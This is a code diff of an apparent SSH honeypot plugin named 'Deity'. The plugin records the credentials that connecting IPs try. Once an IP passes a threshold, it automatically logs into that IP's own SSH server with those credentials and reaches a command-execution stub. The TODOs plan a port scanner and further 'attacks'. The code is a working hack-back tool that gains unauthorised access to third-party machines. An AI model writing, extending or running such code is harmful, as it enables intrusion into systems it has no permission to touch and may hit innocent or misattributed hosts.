@@ -2,8 +2,17 @@
 #
 # By R4stl1n 
 # 
-# This is our "hooker" since it is easier than rewriting code
+# This is our "Plugin" since it is easier than rewriting code
 #
+# Note: Python Logging framework used as it is thread safe
+
+# TODO:
+#   Add extra configuration options from config
+#   Add ability to load a script of commands  
+#   Add a ssh port scanner to find ssh server other ports
+#   Ability to load other attacks
+#   Save all attempted username and password
+
 import sys
 
 from threading import Thread
@@ -16,6 +25,7 @@ from paramiko import AutoAddPolicy
 
 import time
 import uuid
+import logging
 
 class UserIpCombination:
     def __init__(self,target,username,password):
@@ -31,13 +41,12 @@ class UserIpCombination:
 
 class Connection (Thread):
 
-    def __init__(self,combination, logger):
+    def __init__(self,combination):
         super(Connection, self).__init__()
         self.portNumber  = 2222
         self.timeoutTime = 5
         self.target = combination.target
         self.combination = combination
-        self.logger = logger
 
     def run(self):
         for usernameC in self.combination.usernames:
@@ -47,10 +56,8 @@ class Connection (Thread):
 
                 sshConnection.set_missing_host_key_policy(AutoAddPolicy())     
                 try:
-                    print "[*Deity*] Attempting Access to: "+self.target
-
                     sshConnection.connect(self.target, port = self.portNumber, username = usernameC,password = passwordC, timeout = self.timeoutTime, allow_agent = False,look_for_keys = False)
-                    print "[*Deity*] Access Granted to: "+self.target
+                    logging.info("[+] Access granted from: %s" % self.target)
                     self.commandsToExecute(sshConnection)
                     sshConnection.close()
                 except:      
@@ -62,14 +69,14 @@ class Connection (Thread):
         #stdin, stdout, stderr = client.exec_command('ls')
         #for line in stdout:
         #print '... ' + line.strip('\n')
-        print "[*Deity*] Executing Commands on: "
+        logging.info('[+] Executing commands on self.target')
 
 class Deity:
 
-    def __init__(self,logger):
+    def __init__(self,cfg):
         self.currentCombinations = []
         self.connections = []
-        self.logger = logger
+        self.threshholdLimit = int(cfg.get('database_deity', 'threshhold'))
 
     def __del__(self):
         for connection in self.connections:
@@ -81,84 +88,67 @@ class Deity:
         for combination in self.currentCombinations:
             if combination.target == ip:
                 found = True
-                self.logger.write(self.logger,"[*Deity*] Added "+username+":"+password+" for combination: "+ip)
                 combination.usernames.append(username)
                 combination.passwords.append(password)
                 combination.amount = combination.amount + 1
-                if combination.amount >= 3:
-                    self.logger.write(self.logger,"[*Deity*] Attack identified, Smiting: " + ip)
-                    connection = Connection(combination, self.logger)
+                if combination.amount >= self.threshholdLimit:
+                    logging.info('[*] Attempts from %s exceeded threshhold' % ip)
+                    logging.info('[*] Initiating divine intervention on: %s' % ip)
+                    connection = Connection(combination)
                     connection.start()
                     self.connections.append(connection)
                     combination.reset()
 
         if found == False:
-            self.logger.write(self.logger,"[*Deity*] Added new combination for ip: %s"%ip)
             combination = UserIpCombination(ip,username,password)
             self.currentCombinations.append(combination)
 
 class DBLogger(dblog.DBLogger):
-
+ 
     def __init__(self, cfg):
         self.peerIP = None
         self.peerPort = None
-        self.deity = Deity(self)
+        self.deity = Deity(cfg)
         super(DBLogger,self).__init__(cfg)
 
     def start(self, cfg):
-        self.outfile = file(cfg.get('database_deity', 'logfile'), 'a')
+        # Tell paramiko to stop logging to our files
+        logging.getLogger("paramiko").setLevel(logging.WARNING)
+        logging.basicConfig(format='[%(asctime)s] - %(message)s'
+            ,filename=cfg.get('database_deity', 'logfile'),level=logging.INFO)
+        logging.info("------- {New logging session started} -------")
 
     def write(self, session, msg):
-        self.outfile.write('%s [%s]: %s\r\n' % \
-            (session, time.strftime('%Y-%m-%d %H:%M:%S'), msg))
-        self.outfile.flush()
+        pass
 
     def createSession(self, peerIP, peerPort, hostIP, hostPort):
-        sid = uuid.uuid1().hex
-        sensorname = self.getSensor() or hostIP
         self.peerIP = peerIP
         self.peerPort = peerPort
-        self.write(sid, 'New connection: %s:%s' % (peerIP, peerPort))
-        return sid
 
     def handleConnectionLost(self, session, args):
-        #self.write(session, 'Connection lost')
         pass
 
     def handleLoginFailed(self, session, args):
         self.deity.addCombinationEntry(self.peerIP,args['username'],args['password'])
-        self.write(session, 'Login failed [%s/%s]' % \
-            (args['username'], args['password']))
+        logging.info('[!] Failed login attempt from:%s:{%s,%s}' % (self.peerIP,args['username'],args['password']))
 
     def handleLoginSucceeded(self, session, args):
-        self.deity.addCombinationEntry(self.peerIP,args['username'],args['password'])
-        self.write(session, 'Login succeeded [%s/%s]' % \
-            (args['username'], args['password']))
+        logging.info('[!] Login attempt was successful from:%s' % self.peerIP)
 
     def handleCommand(self, session, args):
         pass
-        #self.write(session, 'Command [%s]' % (args['input'],))
 
     def handleUnknownCommand(self, session, args):
         pass
-        #self.write(session, 'Unknown command [%s]' % (args['input'],))
 
     def handleInput(self, session, args):
         pass
-        #self.write(session, 'Input [%s] @%s' % (args['input'], args['realm']))
 
     def handleTerminalSize(self, session, args):
         pass
-        #self.write(session, 'Terminal size: %sx%s' % \
-        #    (args['width'], args['height']))
 
     def handleClientVersion(self, session, args):
         pass
-        #self.write(session, 'Client version: [%s]' % (args['version'],))
 
     def handleFileDownload(self, session, args):
         pass
-        #self.write(session, 'File download: [%s] -> %s' % \
-        #    (args['url'], args['outfile']))
-
-# vim: set sw=4 et:
